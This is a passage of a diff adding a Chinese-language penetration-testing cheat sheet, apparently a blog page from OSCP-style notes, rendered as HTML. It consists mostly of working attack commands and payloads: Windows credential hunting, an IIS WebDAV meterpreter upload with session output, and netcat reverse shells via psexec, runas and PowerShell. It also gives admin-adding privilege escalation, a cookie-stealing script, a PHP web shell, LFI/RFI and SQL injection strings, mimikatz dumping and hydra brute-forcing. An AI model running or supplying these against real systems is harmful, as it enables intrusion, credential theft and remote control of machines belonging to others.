+<span class="token function">hostname</span> <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+net <span class="token function">users</span> <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+ipconfig /all <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+route print <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+arp -A <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+<span class="token function">netstat</span> -ano <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+netsh firewall show state <span class="token operator">>></span> report.txt	
+<span class="token function">timeout</span> <span class="token number">1</span>
+netsh firewall show config <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+schtasks /query /fo LIST /v <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+tasklist /SVC <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+net start <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+DRIVERQUERY <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+reg query HKLM<span class="token punctuation">\</span>SOFTWARE<span class="token punctuation">\</span>Policies<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Installer<span class="token punctuation">\</span>AlwaysInstallElevated <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+reg query HKCU<span class="token punctuation">\</span>SOFTWARE<span class="token punctuation">\</span>Policies<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Installer<span class="token punctuation">\</span>AlwaysInstallElevated <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+<span class="token function">dir</span> /s *pass* <span class="token operator">==</span> *cred* <span class="token operator">==</span> *vnc* <span class="token operator">==</span> *.config* <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+findstr /si password *.xml *.ini *.txt <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+reg query HKLM /f password /t REG_SZ /s <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+reg query HKCU /f password /t REG_SZ /s <span class="token operator">>></span> report.txt 
+<span class="token function">timeout</span> <span class="token number">1</span>
+<span class="token function">dir</span> <span class="token string">"C:<span class="token entity" title="\&quot;">\"</span>
+timeout 1
+dir "</span>C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>" <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+<span class="token function">dir</span> <span class="token string">"C:\Program Files (x86)<span class="token entity" title="\&quot;">\"</span>
+timeout 1
+dir "</span>C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>"
+<span class="token function">timeout</span> <span class="token number">1</span>
+<span class="token function">dir</span> "C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Public<span class="token punctuation">\</span>"
+<span class="token function">timeout</span> <span class="token number">1</span>
+<span class="token builtin class-name">echo</span> REPORT COMPLETE<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Windows Server 2003 and IIS 6.0 WEBDAV Exploiting</p>
+<p><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171117010325/http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html">http://web.archive.org/web/20171117010325/http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">1.2</span>.3.4 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">443</span> -f asp <span class="token operator">></span> aspshell.txt
+
+cadavar http://<span class="token variable">$ip</span>
+dav:/<span class="token operator">></span> put aspshell.txt
+Uploading aspshell.txt to <span class="token variable"><span class="token variable">`</span>/aspshell.txt':
+Progress: <span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">]</span> <span class="token number">100.0</span>% of <span class="token number">38468</span> bytes succeeded.
+dav:/<span class="token operator">></span> copy aspshell.txt aspshell3.asp<span class="token punctuation">;</span>.txt
+Copying <span class="token variable">`</span></span>/aspshell3.txt<span class="token string">' to `/aspshell3.asp%3b.txt'</span><span class="token builtin class-name">:</span>  succeeded.
+dav:/<span class="token operator">></span> <span class="token builtin class-name">exit</span>
+
+msf <span class="token operator">></span> use exploit/multi/handler
+msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp
+msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST <span class="token number">1.2</span>.3.4
+msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LPORT <span class="token number">80</span>
+msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> ExitOnSession <span class="token boolean">false</span>
+msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">></span> exploit -j
+
+<span class="token function">curl</span> http://<span class="token variable">$ip</span>/aspshell3.asp<span class="token punctuation">;</span>.txt
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">1.2</span>.3.4:443 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting the payload handler<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">957487</span> bytes<span class="token punctuation">)</span> to <span class="token number">1.2</span>.3.5
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">1.2</span>.3.4:443 -<span class="token operator">></span> <span class="token number">1.2</span>.3.5:1063<span class="token punctuation">)</span> at <span class="token number">2017</span>-09-25 <span class="token number">13</span>:10:55 -0700<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Windows Server 2003 and IIS 6.0 privledge escalation using impersonation</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/6705">https://www.exploit-db.com/exploits/6705</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Re4son/Churrasco">https://github.com/Re4son/Churrasco</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Inetpub<span class="token operator">></span>churrasco
+churrasco
+/churrasco/--<span class="token operator">></span>Usage: Churrasco.exe <span class="token punctuation">[</span>-d<span class="token punctuation">]</span> <span class="token string">"command to run"</span>
+
+c:<span class="token punctuation">\</span>Inetpub<span class="token operator">></span>churrasco -d <span class="token string">"net user /add &lt;username> &lt;password>"</span>
+c:<span class="token punctuation">\</span>Inetpub<span class="token operator">></span>churrasco -d <span class="token string">"net localgroup administrators &lt;username> /add"</span>
+c:<span class="token punctuation">\</span>Inetpub<span class="token operator">></span>churrasco -d <span class="token string">"NET LOCALGROUP "</span>Remote Desktop Users<span class="token string">" &lt;username> /ADD"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Windows 特权升级漏洞通常用 Python 编写。因此，有必要将使用 pyinstaller.py 编译成可执行文件并上传到远程服务器</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> pyinstaller
+<span class="token function">wget</span> -O exploit.py http://www.exploit-db.com/download/31853 
+python pyinstaller.py --onefile exploit.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>Windows MS11-080</p>
+<p><a target="_blank" rel="noopener" href="http://www.exploit-db.com/exploits/18176/">http://www.exploit-db.com/exploits/18176/</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python pyinstaller.py --onefile ms11-080.py  
+mx11-080.exe -O XP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>快速的从基本 (cmd.exe) shell 运行 powershell 命令的方法</p>
+<p>MS16-032</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39719">https://www.exploit-db.com/exploits/39719</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">powershell -ExecutionPolicy ByPass -command <span class="token string">"&amp; &#123; . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 &#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Powershell Priv 升级工具</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p>
+<p>Windows 中以不同用户身份运行命令的 3 种方法</p>
+<ul>
+<li><p>Sysinternals psexec 是一个方便的工具，可以作为特定用户在远程或本地服务器上运行命令，前提是您有自己的用户名和密码。以下示例使用 netcat for Windows 和 Psexec（在 64 位系统上）创建从 Windows 服务器到我们的 Kali 的反向 shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span><span class="token operator">></span>psexec64 <span class="token punctuation">\</span><span class="token punctuation">\</span>COMPUTERNAME -u Test -p <span class="token builtin class-name">test</span> -h <span class="token string">"c:\users\public<span class="token entity" title="\n">\n</span>c.exe -nc 192.168.1.10 4444 -e cmd.exe"</span> 
+
+PsExec v2.2 - Execute processes remotely
+Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2001</span>-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>Runas.exe 是一个方便的 Windows 工具，只要您知道他们的密码，它就可以让您以另一个用户身份运行程序。下面的例子使用 netcat for Windows 和 Runas.exe 创建了一个从 Windows 服务器到我们的 Kali 的反向 shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span><span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>runas.exe /env /noprofile /user:Test <span class="token string">"c:\users\public<span class="token entity" title="\n">\n</span>c.exe -nc 192.168.1.10 4444 -e cmd.exe"</span>
+Enter the password <span class="token keyword">for</span> Test:
+Attempting to start nc.exe as user <span class="token string">"COMPUTERNAME\Test"</span> <span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>PowerShell 也可用于以其他用户身份启动进程。以下简单的 powershell 脚本将作为指定的用户名和密码运行反向 shell</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$username</span> = <span class="token string">'&lt;username here>'</span>
+<span class="token variable">$password</span> = <span class="token string">'&lt;password here>'</span>
+<span class="token variable">$securePassword</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token variable">$password</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force
+<span class="token variable">$credential</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>PSCredential <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$securePassword</span>
+<span class="token function">Start-Process</span> <span class="token operator">-</span>FilePath C:\Users\Public\nc<span class="token punctuation">.</span>exe <span class="token operator">-</span>NoNewWindow <span class="token operator">-</span>Credential <span class="token variable">$credential</span> <span class="token operator">-</span>ArgumentList <span class="token punctuation">(</span><span class="token string">"-nc"</span><span class="token punctuation">,</span><span class="token string">"192.168.1.10"</span><span class="token punctuation">,</span><span class="token string">"4444"</span><span class="token punctuation">,</span><span class="token string">"-e"</span><span class="token punctuation">,</span><span class="token string">"cmd.exe"</span><span class="token punctuation">)</span> <span class="token operator">-</span>WorkingDirectory C:\Users\Public<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>接下来使用 powershell.exe 运行此脚本：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">powershell -ExecutionPolicy ByPass -command <span class="token string">"&amp; &#123; . C:\Users\public\PowerShellRunAs.ps1; &#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+</ul>
+<p>Windows 服务配置查看器 - 检查服务中可能导致权限提升的错误配置。您可以用自己的可执行文件替换可执行文件，并让 Windows 以特权用户身份执行您想要的任何代码</p>
+<p>icacls scsiaccess.exe</p>
+<p>使用 C 在 Windows 中编译自定义添加用户命令</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">root@kali<span class="token operator">:</span><span class="token operator">~</span># cat useradd<span class="token punctuation">.</span>c  
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span> <span class="token comment">/* system, NULL, EXIT_FAILURE */</span>  </span>
+<span class="token keyword">int</span> <span class="token function">main</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>  
+<span class="token punctuation">&#123;</span>  
+    <span class="token keyword">int</span> i<span class="token punctuation">;</span>  
+    i<span class="token operator">=</span><span class="token function">system</span> <span class="token punctuation">(</span><span class="token string">"net localgroup administrators low /add"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span>
+
+i686<span class="token operator">-</span>w64<span class="token operator">-</span>mingw32<span class="token operator">-</span>gcc <span class="token operator">-</span>o scsiaccess<span class="token punctuation">.</span>exe useradd<span class="token punctuation">.</span>c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>组策略首选项 (GPP)<br>在现代域环境中发现的一个常见的有用错误配置是未受保护的 Windows GPP 设置文件</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">映射域控制器 SYSVOL 共享
+net use z:<span class="token punctuation">\</span><span class="token punctuation">\</span>dc01<span class="token punctuation">\</span>SYSVOL
+找到 GPP 文件：Groups.xml
+<span class="token function">dir</span> /s Groups.xml
+查看密码内容
+<span class="token builtin class-name">type</span> Groups.xml
+使用 GPP 解密
+gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>查找并显示 proof.txt 或 flag.txt</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> run post/windows/gather/win_privs 
+cd<span class="token punctuation">\</span> <span class="token operator">&amp;</span> <span class="token function">dir</span> /b /s proof.txt 
+<span class="token builtin class-name">type</span> c:<span class="token punctuation">\</span>pathto<span class="token punctuation">\</span>proof.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h2 id="Client-Web-and-Password-Attacks"><a href="#Client-Web-and-Password-Attacks" class="headerlink" title="Client, Web and Password Attacks"></a>Client, Web and Password Attacks</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MS12-037 Internet Explorer <span class="token number">8</span> Fixed Col Span ID
+<span class="token function">wget</span> -O exploit.html http://www.exploit-db.com/download/24017
+<span class="token function">service</span> apache2 start
+
+JAVA Signed Jar client side attack
+<span class="token builtin class-name">echo</span> <span class="token string">''</span> <span class="token operator">></span> /var/www/html/java.html
+用户必须在出现的弹出窗口上点击运行
+
+Linux Client Shells
+http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
+
+将后门 Shell 注入 Plink.exe
+backdoor-factory -f /usr/share/windows-binaries/plink.exe -H <span class="token variable">$ip</span> -P <span class="token number">4444</span> -s reverse_shell_tcp
+
+webshell <span class="token keyword">in</span> kali
+<span class="token function">ls</span> -l /usr/share/webshells/
+
+生成受给定密码保护的 PHP 后门
+weevely http://<span class="token variable">$ip</span>/weevely.php s3cr3t
+
+HTTP / HTTPS Web 服务器枚举
+OWASP Dirbuster
+nikto -h <span class="token variable">$ip</span>
+
+浏览器重定向和 IFRAME 注入
+<span class="token operator">&lt;</span>iframe <span class="token assign-left variable">SRC</span><span class="token operator">=</span><span class="token string">"http://<span class="token variable">$ip</span>/report"</span> height <span class="token operator">=</span> <span class="token string">"0"</span> <span class="token assign-left variable">width</span><span class="token operator">=</span><span class="token string">"0"</span><span class="token operator">></span>iframe<span class="token operator">></span>
+
+窃取 Cookie 和会话信息
+<span class="token operator">&lt;</span>javascript<span class="token operator">></span>  
+new image<span class="token punctuation">(</span><span class="token punctuation">)</span>.src<span class="token operator">=</span><span class="token string">"http://<span class="token variable">$ip</span>/bogus.php?output="</span>+document.cookie<span class="token punctuation">;</span>  
+<span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>一个名为 fimap 的 Python 工具可用于自动利用 PHP 中发现的 LFI/RFI 漏洞（用于 LFI 的 sqlmap）</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/kurobeats/fimap">https://github.com/kurobeats/fimap</a></p>
+<p>fimap + phpinfo() Exploit 获取 shell - 如果存在 phpinfo() 文件，通常可以获取 shell，如果您不知道 fimap 可以探测的 phpinfo 文件的位置，可以使用像 OWASP DirBuster 这样的工具</p>
+<p>本地文件包含代码示例</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">include("lang/".$_COOKIE['lang']); 
+include($_GET['page'].".php");
+使用 base64 编码和解码文件
+curl -s \
+"http://$ip/?page=php://filter/convert.base64-encode/resource=index" \
+| grep -e '\[^\\ \]\\&#123;40,\\&#125;' | base64 -d
+
+使用 base 64 编码下载文件
+http://$ip/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+
+
+LFI Linux Files:
+/etc/issue
+/proc/version
+/etc/profile
+/etc/passwd
+/etc/passwd
+/etc/shadow
+/root/.bash_history
+/var/log/dmessage
+/var/mail/root
+/var/spool/cron/crontabs/root
+
+LFI Windows Files:
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\repair\SAM
+%WINDIR%\win.ini
+%SYSTEMDRIVE%\boot.ini
+%WINDIR%\Panther\sysprep.inf
+%WINDIR%\system32\config\AppEvent.Evt
+
+LFI OSX Files:
+/etc/fstab
+/etc/master.passwd
+/etc/resolv.conf
+/etc/sudoers
+/etc/sysctl.conf
+    
+LFI - 下载密码文件
+http://$ip/index.php?page=/etc/passwd
+http://$ip/index.php?file=../../../../etc/passwd
+
+LFI - 编码绕过下载密码文件
+http://$ip/index.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+
+在低于 5.3 的 PHP 版本中，我们可以使用空字节
+GET /addguestbook.php?name=Haxor&amp;comment=Merci!&amp;LANG=../../../../../../../windows/system32/drivers/etc/hosts%00
+
+污染日志文件
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
+
+对于远程文件包含，查找未清理并传递给 PHP 包含函数的 php 代码，并且 php.ini 文件必须配置为允许远程文件
+/etc/php5/cgi/php.ini - "allow_url_fopen" and "allow_url_include" 都设置为“on”
+include($_REQUEST["file"].".php");
+
+http://192.168.11.35/addguestbook.php?name=a&amp;comment=b&amp;LANG=http://192.168.10.5/evil.txt
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">shell<span class="token punctuation">\</span>_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ipconfig"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>测试SQL语法</p>
+<p><a target="_blank" rel="noopener" href="http://sqlfiddle.com/">http://sqlfiddle.com/</a></p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">MSSQL Server SQL 延时注入
+向 MSSQL Server 查询添加 30 秒延迟
+
+原始查询
+SELECT * FROM products WHERE name&#x3D;&#39;Test&#39;;
+注入值
+&#39;; WAITFOR DELAY &#39;00:00:30&#39;; --
+结果查询
+SELECT * FROM products WHERE name&#x3D;&#39;Test&#39;; WAITFOR DELAY &#39;00:00:30&#39;; --
+
+MySQL 延时注入
+为 MySQL 查询添加 30 秒延迟
+
+原始查询
+SELECT * FROM products WHERE name&#x3D;&#39;Test&#39;;
+注入值
+&#39;-SLEEP(30); #
+结果查询
+SELECT * FROM products WHERE name&#x3D;&#39;Test&#39;-SLEEP(30); #
+
+PostGreSQL 延时注入
+为 PostGreSQL 查询添加 30 秒延迟
+
+原始查询
+SELECT * FROM products WHERE name&#x3D;&#39;Test&#39;;
+注入值
+&#39;; SELECT pg_sleep(30); --
+结果查询
+SELECT * FROM products WHERE name&#x3D;&#39;Test&#39;; SELECT pg_sleep(30); --<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>NoSQLMap 安装</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/codingo/NoSQLMap.git
+<span class="token builtin class-name">cd</span> NoSQLMap/ 
+<span class="token function">ls</span> 
+pip <span class="token function">install</span> couchdb 
+pip <span class="token function">install</span> pbkdf2 
+pip <span class="token function">install</span> ipcalc 
+python nosqlmap.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h3><p>AES 解密</p>
+<p><a target="_blank" rel="noopener" href="https://aesencryption.net/">https://aesencryption.net/</a></p>
+<p>将多个网页转换为单词列表</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">for</span> <span class="token for-or-select variable">x</span> <span class="token keyword">in</span> <span class="token string">'index'</span> <span class="token string">'about'</span> <span class="token string">'post'</span> <span class="token string">'contact'</span> <span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token punctuation">\</span>
+  <span class="token function">curl</span> http://<span class="token variable">$ip</span>/<span class="token variable">$x</span>.html <span class="token operator">|</span> html2markdown <span class="token operator">|</span> <span class="token function">tr</span> -s <span class="token string">' '</span> <span class="token string">'\\n'</span> <span class="token operator">>></span> webapp.txt <span class="token punctuation">;</span> <span class="token punctuation">\</span>
+<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>将 html 转换为单词列表字典</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">html2dic index.html.out <span class="token operator">|</span> <span class="token function">sort</span> -u <span class="token operator">></span> index-html.dict<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>默认用户名和密码</p>
+<p><a target="_blank" rel="noopener" href="https://cirt.net/passwords">https://cirt.net/passwords</a></p>
+<p><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171111042032/http://www.defaultpassword.com/">http://web.archive.org/web/20171111042032/http://www.defaultpassword.com/</a></p>
+<p>nmap爆破</p>
+<p><a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/categories/brute.html">https://nmap.org/nsedoc/categories/brute.html</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --script brute -Pn <span class="token operator">&lt;</span>target.com or ip<span class="token operator">></span>
+nmap --script<span class="token operator">=</span>mysql-brute <span class="token variable">$ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>Kali 字典文件/usr/share/wordlists</p>
+<p>crunch工具</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">6</span> <span class="token number">6</span> 0123456789ABCDEF -o crunch1.txt
+crunch <span class="token number">4</span> <span class="token number">4</span> -f /usr/share/crunch/charset.lst mixalpha
+crunch <span class="token number">8</span> <span class="token number">8</span> -t ,@@^^%%%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>Pwdump and Fgdump - 安全帐户管理器 (SAM)</p>
+<ul>
+<li><code>pwdump.exe</code> - 提取密码哈希</li>
+<li><code>fgdump.exe</code> - 转储密码哈希和缓存凭据之前尝试杀死本地防病毒软件</li>
+</ul>
+<p>Windows 凭据编辑器 (WCE)</p>
+<p>允许执行多次攻击以获得明文密码和哈希。用法： <code>wce -w</code></p>
+<p>mimikatz</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
+<p>从内存中提取明文密码、哈希、PIN 码和 kerberos 票证</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">必须具有system权限
+meterpreter<span class="token operator">></span> load mimikatz
+meterpreter<span class="token operator">></span> <span class="token builtin class-name">help</span> mimikatz
+meterpreter<span class="token operator">></span> msv
+meterpreter<span class="token operator">></span> kerberos
+meterpreter<span class="token operator">></span> mimikatz_command -f samdump::hashes
+meterpreter<span class="token operator">></span> mimikatz_command -f sekurlsa::searchPasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>cewl 可以从网页生成密码列表</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl www.megacorpone.com -m <span class="token number">6</span> -w megacorp-cewl.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Medusa，针对受 htaccess 保护的 Web 目录</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">medusa -h <span class="token variable">$ip</span> -u admin -P password-file.txt -M http -m DIR:/admin -T <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>ncrack 暴力破解 RDP</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ncrack -vv --user offsec -P password-file.txt rdp://<span class="token variable">$ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>hydra</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">针对 SNMP
+hydra -P password-file.txt -v <span class="token variable">$ip</span> snmp
+Hydra FTP 已知用户和rockyou密码列表
+hydra -t <span class="token number">1</span> -l admin -P /usr/share/wordlists/rockyou.txt -vV <span class="token variable">$ip</span> <span class="token function">ftp</span>
+Hydra SSH 使用用户和密码列表
+hydra -v -V -u -L users.txt -P passwords.txt -t <span class="token number">1</span> -u <span class="token variable">$ip</span> <span class="token function">ssh</span>
+使用已知密码和用户名列表的 Hydra SSH
+hydra -v -V -u -L users.txt -p <span class="token string">"&lt;known password>"</span> -t <span class="token number">1</span> -u <span class="token variable">$ip</span> <span class="token function">ssh</span>
+Hydra SSH 针对端口 <span class="token number">22</span> 上的已知用户名
